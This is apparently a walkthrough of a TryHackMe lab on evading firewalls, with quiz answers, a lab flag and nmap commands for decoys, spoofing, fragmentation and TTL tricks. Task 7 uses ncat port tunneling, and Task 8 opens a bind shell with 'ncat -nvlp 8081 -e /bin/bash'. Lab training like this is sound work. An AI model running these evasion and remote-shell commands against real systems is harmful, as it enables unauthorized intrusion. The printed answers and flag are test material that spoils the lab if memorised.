# Firewall

{% embed url="https://tryhackme.com/room/redteamfirewalls" %}
https://tryhackme.com/room/redteamfirewalls
{% endembed %}

## Task 1 Introduction

#### The design logic of traditional firewalls is that a port number would identify the service and the protocol. For instance, visit [Service Name and Transport Protocol Port Number Registry](http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) to answer the following questions.

#### If you want to block telnet, which TCP port number would you deny?

{% hint style="success" %}
`23`
{% endhint %}

#### You want to allow HTTPS, which TCP port number do you need to permit?

{% hint style="success" %}
`443`
{% endhint %}

#### What is an alternate TCP port number used for HTTP? It is described as “HTTP Alternate.”

{% hint style="success" %}
`8080`
{% endhint %}

#### You need to allow SNMP over SSH, snmpssh. Which port should be permitted?

{% hint style="success" %}
`5161`
{% endhint %}

## Task 2 Types of Firewalls

#### What is the most basic type of firewall?

{% hint style="success" %}
`Packet-Filtering Firewall`
{% endhint %}

#### What is the most advanced type of firewall that you can have on company premises?

{% hint style="success" %}
`Next-Generation Firewall`
{% endhint %}

## Task 3 Evasion via Controlling the Source MAC/IP/Port

```bash
nmap -sS -Pn -F MACHINE_IP
```

#### What is the size of the IP packet when using a default Nmap stealth (SYN) scan?

![](<../../.gitbook/assets/image (9).png>)

{% hint style="success" %}
`44`
{% endhint %}

#### How many bytes does the TCP segment hold in its data field when using a default Nmap stealth (SYN) scan?

{% hint style="success" %}
`0`
{% endhint %}

#### Approximately, how many packets do you expect Nmap to send when running the command `nmap -sS -F MACHINE_IP`? Approximate to the nearest 100, such as 100, 200, 300, etc.

{% hint style="success" %}
`200`
{% endhint %}

### Decoy(s)

```bash
nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP
nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP
```

![](<../../.gitbook/assets/image (5).png>)

![](<../../.gitbook/assets/image (10).png>)

#### Approximately, how many packets do you expect Nmap to send when running the command `nmap -sS -Pn -D RND,10.10.55.33,ME,RND -F MACHINE_IP`? Approximate to the nearest 100, such as 100, 200, 300, etc.

{% hint style="success" %}
`800`
{% endhint %}

### Proxy

```bash
nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP
```

#### What do you expect the target to see as the source of the scan when you run the command `nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP`

{% hint style="success" %}
`10.10.13.37`
{% endhint %}

### Spoofed MAC Address

#### What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, `00:02:DC`?

![](<../../.gitbook/assets/Screenshot from 2022-05-12 06-51-39.png>)

{% hint style="success" %}
`Fujitsu General Ltd`
{% endhint %}

### Spoofed IP Address

#### To mislead the opponent, you decided to make your port scans appear as if coming from a local access point that has the IP address `10.10.0.254`. What option needs to be added to your Nmap command to spoof your address accordingly?

{% hint style="success" %}
`-S 10.10.0.254`
{% endhint %}

### Fixed Source Port Number

```bash
nmap -sS -Pn -g 8080 -F MACHINE_IP
```

![](<../../.gitbook/assets/image (15).png>)

#### You decide to use Nmap to scan for open UDP ports. You notice that using `nmap -sU -F MACHINE_IP` to discover the open common UDP ports won’t give you any meaningful results. What do you need to add to your Nmap command to set the source port number to 53?

{% hint style="success" %}
`-g 53`
{% endhint %}

## Task 4 Evasion via Forcing Fragmentation, MTU, and Data Length

### Fragment Your Packets with 8 Bytes of Data

```bash
nmap -sS -Pn -f -F MACHINE_IP
```

#### What is the size of the IP packet when running Nmap with the `-f` option?

![](<../../.gitbook/assets/image (8).png>)

{% hint style="success" %}
`28`
{% endhint %}

### Fragment Your Packets with 16 Bytes of Data

```bash
nmap -sS -Pn -ff -F MACHINE_IP
```

![](<../../.gitbook/assets/image (6).png>)

#### What is the maximum size of the IP packet when running Nmap with the `-ff` option?

{% hint style="success" %}
`36`
{% endhint %}

### Fragment Your Packets According to a Set MTU

```bash
nmap -sS -Pn --mtu 8 -F MACHINE_IP
```

#### What is the maximum size of the IP packet when running Nmap with `--mtu 36` option?

{% hint style="success" %}
`56`
{% endhint %}

### Generate Packets with Specific Length

```bash
nmap -sS -Pn --data-length 64 -F MACHINE_IP
```

![](<../../.gitbook/assets/image (11).png>)

#### What is the maximum size of the IP packet when running Nmap with `--data-length 128` option?

{% hint style="success" %}
`148`
{% endhint %}

## Task 5 Evasion via Modifying Header Fields

### Set TTL

```bash
nmap -sS -Pn --ttl 81 -F 10.10.84.15
```

![](<../../.gitbook/assets/image (7).png>)

#### Start the AttackBox and the machine attached to this task. After you give them time to load fully, scan the attached MS Windows machine using `--ttl 1` option. Check the number of ports that appear to be open. The answer will vary depending on whether you are using the AttackBox or connecting over VPN. We suggest you try both.

```bash
nmap -Pn --ttl 1 10.10.84.15
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 07-51-45.png>)

#### Scan the attached MS Windows machine using `--ttl 2` option. How many ports appear to be open?

```bash
nmap -Pn --ttl 2 10.10.84.15
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 07-52-14.png>)

{% hint style="success" %}
`3`
{% endhint %}

### Use a Wrong Checksum

```bash
nmap -Pn -sS --badsum -F 10.10.84.15
```

![](<../../.gitbook/assets/image (14).png>)

#### Scan the attached MS Windows machine using the `--badsum` option. How many ports appear to be open?

![](<../../.gitbook/assets/Screenshot from 2022-05-13 07-56-18.png>)

{% hint style="success" %}
`0`
{% endhint %}

## Task 6 Evasion Using Port Hopping

![](<../../.gitbook/assets/image (13).png>)

#### Using this simple technique, discover which port number of the following destination TCP port numbers are reachable from the protected system.

* 21
* 23
* 25
* 26
* 27

![](<../../.gitbook/assets/Screenshot from 2022-05-13 08-11-39.png>)

![](<../../.gitbook/assets/Screenshot from 2022-05-13 08-11-06.png>)

{% hint style="success" %}
`21`
{% endhint %}

## Task 7 Evasion Using Port Tunneling

![](<../../.gitbook/assets/image (12).png>)

#### We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We’re continuing to use the web-form from Task 6 to set up the `ncat` listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag.

```bash
ncat -nvlp 8008 -c 'ncat -nv 10.10.127.43 80'
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 08-19-10.png>)

![](<../../.gitbook/assets/Screenshot from 2022-05-13 08-19-36.png>)

{% hint style="success" %}
`THM{1298331956}`
{% endhint %}

## Task 8 Evasion Using Non-Standard Ports

#### We’re continuing to use the web-form from Task 6 to set up the `ncat` listener. Knowing that the firewall does not block packets to destination port 8081, use `ncat` to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in?

```bash
ncat -nvlp 8081 -e /bin/bash
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 08-23-00.png>)

```bash
ncat -nv 10.10.127.43 8081
id
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 08-24-00.png>)

## Task 9 Next-Generation Firewalls

#### What is the number of the highest OSI layer that an NGFW can process?

{% hint style="success" %}
`7`
{% endhint %}
